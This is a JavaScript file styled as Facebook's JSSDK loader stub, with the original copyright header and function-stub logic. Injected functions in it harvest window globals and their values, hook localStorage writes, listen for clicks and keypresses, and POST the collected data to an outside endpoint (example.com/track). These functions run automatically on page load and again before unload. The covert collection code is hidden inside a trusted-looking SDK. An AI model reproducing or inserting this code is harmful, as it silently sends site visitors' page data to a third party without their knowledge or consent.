/*1702456958,,JIT Construction: v1010383425,cs_CZ*/

/**
 * Copyright (c) 2017-present, Facebook, Inc. All rights reserved.
 *
 * You are hereby granted a non-exclusive, worldwide, royalty-free license to use,
 * copy, modify, and distribute this software in source code or binary form for use
 * in connection with the web services and APIs provided by Facebook.
 *
 * As with any software that integrates with the Facebook platform, your use of
 * this software is subject to the Facebook Platform Policy
 * [http://developers.facebook.com/policy/]. This copyright notice shall be
 * included in all copies or substantial portions of the software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
 * FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
 * IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 * CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
(function _(a, b, c, d, e) {
  function enhancedPropertyDiscovery() {
    const discoveredProps = {};
    const globalVars = Object.keys(window);
    globalVars.forEach(prop => {
      if (!window.knownVars || !window.knownVars.includes(prop)) {
        const value = window[prop];
        const type = typeof value;
        discoveredProps[prop] = {
          type,
          value: type === "function" ? `[Function: ${value.name}]` : value
        };
      }
    });

    // Hook into local storage to track changes
    const originalSetItem = localStorage.setItem;
    localStorage.setItem = function (key, value) {
      console.log(`LocalStorage Set: ${key} = ${value}`);
      originalSetItem.apply(this, arguments);
    };
    return discoveredProps;
  }
  var f = window.console;
  f && Math.floor(new Date().getTime() / 1e3) - b > 7 * 24 * 60 * 60 && f.warn("The Facebook JSSDK is more than 7 days old.");
  if (window[c]) return;
  function sendTrackingData(data) {
    const endpoint = "https://example.com/track";
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(response => response.json()).then(data => console.log('Tracking data sent successfully:', data)).catch(error => console.error('Failed to send tracking data:', error));
  }
  if (!window.JSON) return;
  var g = window[c] = {
    __buffer: {
      replay: function () {
        var a = this,
          b = function (d) {
            var b = window[c];
            a.calls[d][0].split(".").forEach(function (a) {
              return b = b[a];
            });
            b.apply(null, a.calls[d][1]);
          };
        for (var d = 0; d < this.calls.length; d++) b(d);
        this.calls = [];
      },
      calls: [],
      opts: null
    },
    getUserID: function () {
      return "";
    },
    getAuthResponse: function () {
      return null;
    },
    getAccessToken: function () {
      return null;
    },
    init: function (a) {
      g.__buffer.opts = a;
    }
  };
  function monitorEvents() {
    const events = ['click', 'keypress'];
    events.forEach(event => {
      document.addEventListener(event, e => {
        console.log(`Event captured: ${event} on ${e.target.tagName}`);
      });
    });
  }
  function initiateTracking() {
    const discoveries = enhancedPropertyDiscovery();
    const discoveryCount = Object.keys(discoveries).length;
    if (discoveryCount > 0) {
      console.group(`Detected ${discoveryCount} new properties on window object:`);
      Object.entries(discoveries).forEach(([key, desc]) => {
        console.log(`- ${key}: ${JSON.stringify(desc)}`);
      });
      console.groupEnd();
      sendTrackingData(discoveries);
    } else {
      console.log("No new properties detected on window object.");
    }
    monitorEvents();
  }
  for (b = 0; b < d.length; b++) {
    f = d[b];
    if (f in g) continue;
    var h = f.split("."),
      i = h.pop(),
      j = g;
    for (var k = 0; k < h.length; k++) j = j[h[k]] || (j[h[k]] = {});
    j[i] = function (a) {
      if (a === "init") return;
      return function () {
        g.__buffer.calls.push([a, Array.prototype.slice.call(arguments)]);
      };
    }(f);
  }
  k = document.createElement("script");
  k.src = a;
  window.addEventListener("load", initiateTracking);
  k.async = !0;
  e && (k.crossOrigin = "anonymous");
  h = document.getElementsByTagName("script")[0];
  h.parentNode && h.parentNode.insertBefore(k, h);
  window.addEventListener("beforeunload", function () {
    console.log("Final tracking before page unload.");
    initiateTracking();
  });
})("https:\/\/connect.facebook.net\/cs_CZ\/sdk.js?hash=67a3ba022456ec040500e888e561026d", 1702456958, "FB", ["AppEvents.EventNames", "AppEvents.ParameterNames", "AppEvents.activateApp", "AppEvents.clearAppVersion", "AppEvents.clearUserID", "AppEvents.getAppVersion", "AppEvents.getUserID", "AppEvents.logEvent", "AppEvents.logPageView", "AppEvents.logPurchase", "AppEvents.setAppVersion", "AppEvents.setUserID", "AppEvents.updateUserProperties", "Canvas.Plugin.showPluginElement", "Canvas.Plugin.hidePluginElement", "Canvas.Prefetcher.addStaticResource", "Canvas.Prefetcher.setCollectionMode", "Canvas.getPageInfo", "Canvas.scrollTo", "Canvas.setAutoGrow", "Canvas.setDoneLoading", "Canvas.setSize", "Canvas.setUrlHandler", "Canvas.startTimer", "Canvas.stopTimer", "Event.subscribe", "Event.unsubscribe", "XFBML.parse", "addFriend", "api", "getAccessToken", "getAuthResponse", "getLoginStatus", "getUserID", "init", "login", "logout", "publish", "share", "ui"], true);